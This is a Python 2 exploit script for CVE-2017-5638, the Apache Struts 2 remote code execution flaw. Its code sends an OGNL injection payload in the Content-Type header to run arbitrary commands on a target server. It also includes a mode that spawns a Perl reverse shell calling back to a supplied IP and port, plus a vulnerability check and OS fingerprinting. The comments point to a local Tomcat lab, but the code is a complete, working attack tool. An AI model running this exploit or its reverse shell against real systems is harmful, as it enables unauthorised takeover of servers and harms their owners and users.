# CVE-2017-5638
# Apache Struts 2 Vulnerability Remote Code Execution
# Reverse shell from target
# Author: anarc0der - github.com/anarcoder
# Tested with tomcat8

# Install tomcat8
# Deploy WAR file https://github.com/nixawk/labs/tree/master/CVE-2017-5638

# Ex:
# Open: $ nc -lnvp 4444
# python2 struntsrce.py --target=http://localhost:8080/struts2_2.3.15.1-showcase/showcase.action --ip=127.0.0.1 --port=4444

"""
Usage:
    struntsrce.py --target=<arg> --test
    struntsrce.py --target=<arg> --cmd=<arg>
    struntsrce.py --target=<arg> --ip=<arg> --port=<arg>
    struntsrce.py --help
    struntsrce.py --version

Options:
    -h --help                                Open help menu
    -v --version                             Show version
Required options:
    --target='url target'                    your target :)
    --test                                   check if target is vulnerable or not
    --cmd='uname -a'                         your command to execute in target
    --ip='10.10.10.1'                        your ip
    --port=4444                              open port for back connection

"""

import urllib2
import httplib
import os
import sys
from docopt import docopt, DocoptExit


class CVE_2017_5638():

    def __init__(self, p_target):
        self.target = p_target
    #    self.ip = p_ip
    #    self.port = p_port
    #    self.exploit()

    def generate_revshell(self, p_ip, p_port):
        revshell = "perl -e \\'use Socket;$i=\"{0}\";$p={1};"\
                   "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"\
                   "if(connect(S,sockaddr_in($p,inet_aton($i)))){{open"\
                   "(STDIN,\">&S\");open(STDOUT,\">&S\");"\
                   "open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};\\'"
        return revshell.format(p_ip, p_port)

    def generate_payload(self, p_cmd):
        payload = "%{{(#_='multipart/form-data')."\
                  "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."\
                  "(#_memberAccess?"\
                  "(#_memberAccess=#dm):"\
                  "((#container=#context['com.opensymphony.xwork2."\
                  "ActionContext.container'])."\
                  "(#ognlUtil=#container.getInstance(@com.opensymphony."\
                  "xwork2.ognl.OgnlUtil@class))."\
                  "(#ognlUtil.getExcludedPackageNames().clear())."\
                  "(#ognlUtil.getExcludedClasses().clear())."\
                  "(#context.setMemberAccess(#dm))))."\
                  "(#cmd='{0}')."\
                  "(#iswin=(@java.lang.System@getProperty('os.name')."\
                  "toLowerCase().contains('win')))."\
                  "(#cmds=(#iswin?{{'cmd.exe','/c',#cmd}}:"\
                  "{{'/bin/bash','-c',#cmd}}))."\
                  "(#p=new java.lang.ProcessBuilder(#cmds))."\
                  "(#p.redirectErrorStream(true)).(#process=#p.start())."\
                  "(#ros=(@org.apache.struts2.ServletActionContext@get"\
                  "Response().getOutputStream()))."\
                  "(@org.apache.commons.io.IOUtils@copy"\
                  "(#process.getInputStream(),#ros)).(#ros.flush())}}"
        return payload.format(p_cmd)

    def send_xpl(self, p_payload):
        try:
            # Set proxy for debug request, just uncomment these lines 
            # Change the proxy port

            #proxy = urllib2.ProxyHandler({'http': '127.0.0.1:8081'})
            #opener = urllib2.build_opener(proxy)
            #urllib2.install_opener(opener)

            headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)'
                                     ' AppleWebKit/537.36 (KHTML, like Gecko)'
                                     ' Chrome/55.0.2883.87 Safari/537.36',
                       'Content-Type': p_payload}
            xpl = urllib2.Request(self.target, headers=headers)
            body = urllib2.urlopen(xpl).read()
        except httplib.IncompleteRead as b:
            body = b.partial
        except:
            pass
        return body

    def os_detect(self):
        cmd = 'uname'
        resp = self.send_xpl(self.generate_payload(cmd))
        if 'Linux' in resp or 'Darwin' in resp:
            print '[+] Unix-like OS system detected.\n'
        else:
            print '[+] Windows OS system detected.\n'

    def test_vuln(self):
        cmd = 'ls'
        print '\n[+] Testing ' + self.target
        resp = self.send_xpl(self.generate_payload(cmd))
        tags = ['<html', '<head', '<body', '<script', '<div']
        if any(tag not in resp.lower() for tag in tags):
            print '[+] Target possibly vulnerable'
            print '[+] Finger printing OS system..'
            self.os_detect()
        else:
            print '[-] Target not vulnerable\n'
            sys.exit(0)

    def exec_cmd(self, p_cmd):
        print '\n[+] Target: {0}'.format(self.target)
        print '[+] Executing: {0}\n\n'.format(p_cmd)
        resp = self.send_xpl(self.generate_payload(p_cmd))
        print resp

    def exec_revshell(self, p_ip, p_port):
        print '\n[+] Target: {0}'.format(self.target)
        print '[+] Dont forget to listen on port: {0}'.format(p_port)
        print '[+] Attempting reverse shell...\n'

        self.send_xpl(self.generate_payload(
            self.generate_revshell(p_ip, p_port)))


def main():
    try:
        arguments = docopt(__doc__, version="Apache Strunts RCE Exploit")
        target = arguments['--target']
        test = arguments['--test']
        cmd = arguments['--cmd']
        ip = arguments['--ip']
        port = arguments['--port']

    except DocoptExit as e:
        os.system('python struntsrce.py --help')
        sys.exit(1)

    x = CVE_2017_5638(target)
    if test:
        x.test_vuln()
    if cmd:
        x.exec_cmd(cmd)
    if ip and port:
        x.exec_revshell(ip, port)


if __name__ == '__main__':
    main()
